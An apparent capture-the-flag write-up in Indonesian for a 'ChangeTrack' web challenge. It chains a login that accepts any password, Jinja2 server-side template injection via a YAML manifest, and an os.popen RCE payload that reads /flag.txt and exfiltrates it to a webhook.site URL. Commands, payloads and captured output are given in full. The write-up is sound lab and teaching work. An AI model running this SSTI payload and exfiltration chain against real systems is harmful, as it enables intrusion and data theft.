# ChangeTrack — Analisis

[← Overview](48-changetrack.md) · [Index](index.md)

### 2.1 Login yang rusak

Uji kredensial:

```bash
for pw in admin admin123 password anything x; do
  curl -sS -o /dev/null -w "$pw -> %{http_code} %{redirect_url}\n" \
    -c cj -X POST -d "email=admin@changetrack.local&password=$pw" "$BASE/login"
done
```

Hasil:

```text
admin      -> 302 http://s1.nfx.my.id:40359/dashboard
admin123   -> 302 http://s1.nfx.my.id:40359/dashboard
password   -> 302 http://s1.nfx.my.id:40359/dashboard
anything   -> 302 http://s1.nfx.my.id:40359/dashboard
x          -> 200   (Invalid credentials. Account not found.)
```

Selain itu, email acak yang mengandung `@` (mis. `zz123@changetrack.local`) juga mendapat `302` pada percobaan pertama; kami tidak memverifikasi apakah sesi tersebut benar-benar valid. Yang penting untuk exploit: `admin@changetrack.local` dengan password `anything` menghasilkan session yang benar-benar menampilkan dashboard admin. Password 1 karakter (`x`) ditolak dengan pesan “Account not found”; penyebab pasti validasi tersebut tidak kami telusuri lebih lanjut.

Kami memakai `admin@changetrack.local` / `anything` untuk masuk ke workspace admin. Ini bukan bug utama yang dimaksud challenge, tetapi merupakan kelemahan autentikasi yang mempermudah langkah berikutnya.

### 2.2 Struktur watcher dan manifest YAML

`GET /watchers/watch-01` menampilkan manifest:

```yaml
watcher:
  name: GitHub Release Price Tracker
  target_url: https://api.github.com/events
  check_interval: 300
notification:
  webhook_url: https://api.changetrack.io/webhook/dev
  format: yaml
  template: |
    [ChangeTrack Notification]
    Target URL: {{ target_url }}
    Check Status: {{ status }}
    Message: Webpage content change detected at {{ check_time }}.
```

Form edit (`/watchers/watch-01/edit`) mengirim:

- `name`
- `target_url`
- `yaml_manifest` (textarea)

Tombol “Dispatch Webhook Notification” melakukan `POST /watchers/watch-01/test`. Worker merender `notification.template` dengan Jinja2 dan mengirim body hasil render ke `notification.webhook_url`.

### 2.3 Jinja2 SSTI

Uji paling aman: ganti template menjadi:

```yaml
    TEMPLATE_MARKER_49 = {{ 7*7 }}
```

Simpan manifest dan dispatch. Webhook menerima:

```text
HELLO_WEBHOOK_SITE 49
target=https://api.github.com/events
```

`{{ 7*7 }}` dievaluasi menjadi `49` → **SSTI confirmed**.

Payload RCE:

```jinja2
{{ cycler.__init__.__globals__.os.popen('id; cat /flag.txt').read() }}
```

`cycler` adalah objek Jinja2 global; `__init__.__globals__` memberi akses ke modul `os`, lalu `popen(...).read()` mengeksekusi shell. Karena template dirender tanpa `SandboxedEnvironment`, payload ini berhasil.

### 2.4 OOB exfiltration

Karena response `/test` hanya `302` dan tidak menampilkan body notifikasi, hasil perintah harus dikirim keluar. Kami membuat token webhook.site:

```bash
curl -sS -X POST https://webhook.site/token \
  -H 'Content-Type: application/json' -d '{}'
# {"uuid":"8509b71c-b1c7-4a12-baf7-26428e5b36a1", ...}
```

Manifest diubah:

```yaml
notification:
  webhook_url: https://webhook.site/8509b71c-b1c7-4a12-baf7-26428e5b36a1
  format: yaml
  template: |
    FLAG1
    {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

Setelah `POST /watchers/watch-01/test`, webhook.site menerima:

```json
{
  "uuid": "25852c30-ba6f-464b-9ce6-4b2596fdbd33",
  "created_at": "2026-11-08 01:26:06",
  "ip": "116.212.75.209",
  "method": "POST",
  "url": "https://webhook.site/8509b71c-b1c7-4a12-baf7-26428e5b36a1",
  "content": "FLAG1\nNFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}\n"
}
```

IP `116.212.75.209` (Indonesia) dan `User-Agent: python-requests/2.34.2` menunjukkan request berasal dari worker challenge, bukan dari mesin kami.

### 2.5 Catatan saat enumerasi

- `cat /flag.txt` berhasil dan mengembalikan flag.
- `echo /app/*` menunjukkan layout: `/app/app.py`, `/app/templates`, `/app/utils`, `/tmp/changetrack_users.json`.
- `ls /`, `env`, `cat /etc/passwd` pada beberapa percobaan tidak menghasilkan webhook (kemungkinan output/command tertentu terfilter atau worker gagal). Kami tidak membutuhkannya karena `/flag.txt` sudah cukup.
- Target `https://httpbin.org/uuid` sempat berhenti memicu notifikasi (mungkin rate limit); `https://api.github.com/zen` (selalu berubah) dipakai untuk memastikan worker mendeteksi perubahan.
- Setiap klik “test” dapat mengirim dua request (worker + test), sehingga capture bisa duplikat. Itu normal.

### 2.6 Rantai penuh

```text
login sebagai admin@changetrack.local (password apa pun non-trivial)
  -> edit watcher-01
  -> notification.webhook_url = https://webhook.site/<token>
  -> notification.template = Jinja2 SSTI
  -> POST /watchers/watch-01/test
  -> worker render + POST ke webhook
  -> flag di body capture
```
